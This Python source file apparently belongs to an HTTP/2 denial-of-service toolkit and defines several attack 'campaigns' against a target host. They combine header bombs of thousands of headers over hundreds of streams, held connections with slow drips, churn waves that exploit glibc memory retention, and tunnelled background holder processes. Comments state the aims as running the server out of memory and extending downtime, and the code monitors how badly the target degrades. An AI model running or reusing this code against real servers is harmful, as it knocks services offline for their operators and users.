"""Churn, OOM, pipelined and sustained campaigns."""
from __future__ import annotations

import subprocess
import sys
import threading
import time

from attack_config import AttackConfig, profile_churn, profile_efficiency, profile_sustain
from attack_runner import run_attack
from models import ServerProbe
from paths import BENCH_DIR, CSV_PATH, DEFAULT_PORT, LOG_DIR
from probe import monitor_during, probe_server
from tunnel_runner import popen as tunnel_popen


def run_optimized_single_client_oom(host: str, cycles: int = 25) -> None:
    """
    Efficiency profile: 4096 headers × 256 streams, 80 conn/cycle, hard_hold 12s drip.
    Churn cycles stack glibc retention; hard_hold pins active allocations.
    """
    cfg = profile_efficiency()
    cfg = AttackConfig(
        streams=cfg.streams,
        headers=cfg.headers,
        hold=65,
        drip=10,
        hold_mode="hard_hold",
        waves_per_conn=1,
        bomb_mode="sequential",
        conn_stagger_sec=0.015,
    )
    print("=== OPTIMIZED SINGLE-CLIENT OOM (v2) ===")
    print(f"Target: {host}")
    print(f"Config: {cfg.to_extra()}")
    print(f"Est. RAM/cycle @80 conn: {cfg.est_server_mb_per_conn() * 80:.0f} MiB\n")

    degraded_streak = 0
    for c in range(cycles):
        print(f"--- Cycle {c + 1}/{cycles} ---")
        r = run_attack(
            f"opt_oom_v2_{c + 1}",
            host,
            DEFAULT_PORT,
            connections=80,
            cfg=cfg,
            notes=f"optimized v2 cycle {c + 1}",
        )
        if r and (r.server_down or (r.probe_after.http_code or 0) >= 500 or (r.probe_after.latency_sec or 0) > 5):
            degraded_streak += 1
            print(f">>> Degraded (streak={degraded_streak}) <<<")
        else:
            degraded_streak = max(0, degraded_streak - 1)
        time.sleep(0.8 if degraded_streak else 1.5)

    print(f"\n=== OPTIMIZED OOM COMPLETE — logs: {CSV_PATH} ===")


def run_churn(host: str, cycles: int = 40, connections: int = 45) -> None:
    """Fire-and-forget + multi-wave: max allocation churn, minimal client wire."""
    cfg = profile_churn()
    print("=== CHURN MODE (fire-and-forget + 2 waves/conn) ===")
    print(f"Config: {cfg.to_extra()}\n")

    for c in range(cycles):
        print(f"--- Churn {c + 1}/{cycles} ---")
        run_attack(
            f"churn_{c + 1}",
            host,
            DEFAULT_PORT,
            connections=connections,
            cfg=cfg,
        )
        time.sleep(0.4)

    p = probe_server(host, timeout=20)
    print(f"Post-churn probe: code={p.http_code} lat={p.latency_sec}s ok={p.ok}")


def run_pipelined_sustain(host: str, holders: int = 15, churn_cycles: int = 12) -> None:
    """
    Background hard-hold workers + foreground churn waves.
    Extends downtime: holders pin memory while churn adds glibc retention.
    """
    cfg_hold = profile_sustain()
    cfg_hold = AttackConfig(
        streams=128,
        headers=12000,
        hold=900,
        drip=10,
        hold_mode="hard_hold",
        waves_per_conn=1,
    )
    cfg_churn = profile_churn()

    print("=== PIPELINED SUSTAIN ===")
    print(f"Holders: {holders} | Churn cycles: {churn_cycles}")

    py = sys.executable
    worker = BENCH_DIR / "single_conn_worker.py"
    log_dir = LOG_DIR / f"pipelined_{int(time.time())}"
    log_dir.mkdir(parents=True, exist_ok=True)
    procs: list[subprocess.Popen] = []

    for i in range(holders):
        lp = log_dir / f"holder_{i}.log"
        p = tunnel_popen(
            [py, str(worker), "--host", host, "--conn-id", str(i),
             "--streams", str(cfg_hold.streams), "--headers", str(cfg_hold.headers),
             "--hold", str(cfg_hold.hold), "--drip", str(cfg_hold.drip),
             "--hold-mode", "hard_hold"],
            stdout=lp.open("w"),
            stderr=subprocess.STDOUT,
        )
        procs.append(p)
        time.sleep(0.3)

    stop = threading.Event()
    samples: list[ServerProbe] = []
    mon = threading.Thread(target=monitor_during, args=(host, stop, samples, 5.0), daemon=True)
    mon.start()

    for c in range(churn_cycles):
        run_attack(
            f"pipelined_churn_{c + 1}",
            host,
            DEFAULT_PORT,
            connections=40,
            cfg=cfg_churn,
        )
        time.sleep(0.5)

    stop.set()
    mon.join(timeout=3)
    probe_after = probe_server(host, timeout=20)
    fails = sum(1 for s in samples if not s.ok)
    print(f"Pipelined done: probe_failures={fails}/{len(samples)} after={probe_after.http_code} lat={probe_after.latency_sec}")
    print(f"Holder logs: {log_dir} ({sum(1 for p in procs if p.poll() is None)} still running)")


def run_sustained(host: str, connections: int = 40, cycles: int = 10, hold: int = 10, drip: int = 5) -> None:
    cfg = profile_efficiency()
    cfg = AttackConfig(
        streams=cfg.streams,
        headers=cfg.headers,
        hold=hold,
        drip=drip,
        hold_mode="hard_hold",
    )
    for c in range(cycles):
        run_attack(f"sustained_{c + 1}", host, DEFAULT_PORT, connections, cfg=cfg)
        time.sleep(1)